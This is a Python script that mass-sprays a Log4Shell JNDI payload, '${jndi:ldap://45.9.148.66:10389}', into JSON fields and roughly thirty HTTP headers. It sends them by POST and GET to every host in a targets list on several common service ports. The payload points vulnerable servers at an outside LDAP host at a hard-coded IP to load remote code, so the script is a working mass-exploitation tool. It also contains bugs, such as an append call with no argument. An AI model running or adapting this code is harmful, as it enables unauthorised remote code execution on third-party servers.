import traceback
from hyperlink import DecodedURL
from twisted.internet.task import react
import json
import copy
import treq
from twisted.internet import reactor
from twisted.web.client import Agent
from twisted.web.http_headers import Headers
from twisted.internet import defer, task, reactor
import treq
import asyncio
from timeit import default_timer
from concurrent.futures import ThreadPoolExecutor
import asyncio
import aiohttp
import time

class JsonFuzz:
    def __init__(self):
        self.json_loaded = False
        self.jndi_string = "${jndi:ldap://45.9.148.66:10389}"
        self.fuzzy_json = []
        self.urls = []

    def _check_if_loaded(self):
        if self.json_loaded == False:
            raise Exception("You don't have any JSON loaded, use load_json")

    def add_urls(self, urls):
        if not isinstance(urls, list):
            raise Exception("You must provide a list of URLs")

        for url in urls:
            self.urls.append()

    def _print_loaded(self):
        self._check_if_loaded()
        print(self.json_dic)
    
    def _print_fuzzed(self):
        print(self.fuzzy_json)

    def load_json(self, json_string):
        """Load JSON string, set class state to json loaded true"""
        self.json_loaded = True
        self.json_dic = json.loads(json_string)
        return self.json_dic

    def replace_value(self, _dic, key_to_fuzz_value, fuzzed_value = None):
        """replace a value in the json dictionary"""
        self._check_if_loaded()
        if not fuzzed_value:
            _dic[key_to_fuzz_value] = self.jndi_string
        else:
            _dic[key_to_fuzz_value] = fuzzed_value

        return _dic

    def replace_key(self, _dic, old_key, fuzzed_key_value = None):
        _dic[self.jndi_string] = _dic[old_key]
        del _dic[old_key]

        return _dic

    def create_fuzz_strings_values(self):
        self._check_if_loaded()
        json_fuzzed_strings_list = {}
        for k in self.json_dic:
            dic_copy = copy.deepcopy(self.json_dic)
            dic_second_copy = copy.deepcopy(self.json_dic)
            self.replace_value(dic_copy, k)
            self.replace_key(dic_second_copy, k)
            self.fuzzy_json.append(dic_copy)
            self.fuzzy_json.append(dic_second_copy)

        return self.fuzzy_json

if __name__ == "__main__":
    
    test_json = '{"key1" : "val1", "key2" : "val2"}'
    print("[*] Mutating JSON")
    jf = JsonFuzz()
    jf.load_json(test_json)
    fuzz_strings = jf.create_fuzz_strings_values()
    all_http_headers = ["Cache-Control", "Connection", "Date", "Pragma", "Trailer", "Transfer-Encoding", "Upgrade", "Via", "Warning", "Accept", "Accept-Charset", "Accept-Charset", "Accept-Enc\oding", "Accept-Language", "Authorization", "Cookie", "Expect", "From", "Host", "If-Match", "If-Modified-Since", "If-None-Match", "If-Range", "If-Unmodified-Since", "Max-Forwards", "Proxy-Author\ization", "Range", "Referer", "TE", "User-Agent", "xxxyyxxx"]


    headers = {}
    for header in all_http_headers:
        headers[header] = "${jndi:ldap://45.9.148.66:10389}"


    async def post(url, session):
        for fuzz_string in fuzz_strings:
            try:
                print(f"Fuzzying url {url}")
                async with session.post(url=url, data = fuzz_string, headers = headers, timeout = 3) as response:
                    resp = await response.read()
                    print("[*] Successfully got url with POST {} with resp of length {} and data {}".format(url, len(resp), str(fuzz_string)))
                async with session.get(url=url, data = fuzz_string, headers = headers, timeout=3) as response:
                    resp = await response.read()
                    print("[*] Successfully got with GET url {} with resp of length {} and data {}".format(url, len(resp), str(fuzz_string)))
            except Exception as e:
                #traceback.print_exc()
                print("[!] Unable to get url {} due to {}.".format(url, e.__class__))

    async def main(urls):
        async with aiohttp.ClientSession() as session:
            temp_urls = []
            ports = [8938, 9200, 8000, 8888, 8983, 8080, 8443]
            for url in urls:
                url = url.strip()
                for port in ports:
                    full_url = "https://" + url + ":" + str(port)
                    print(f"adding {full_url}")
                    temp_urls.append(full_url)
                    if len(temp_urls) % 1000 == 0:
                        ret = await asyncio.gather(*[post(url_f, session) for url_f in temp_urls])
                        temp_urls = []
                        print("Got divisible by 100 gathering and clearing list temp_urls")
                        print("Pulled {} websites. Moving to the next batch".format(str(len(temp_urls))))

    urls = open("targets.txt")
    start = time.time()
    asyncio.run(main(urls))
    end = time.time()

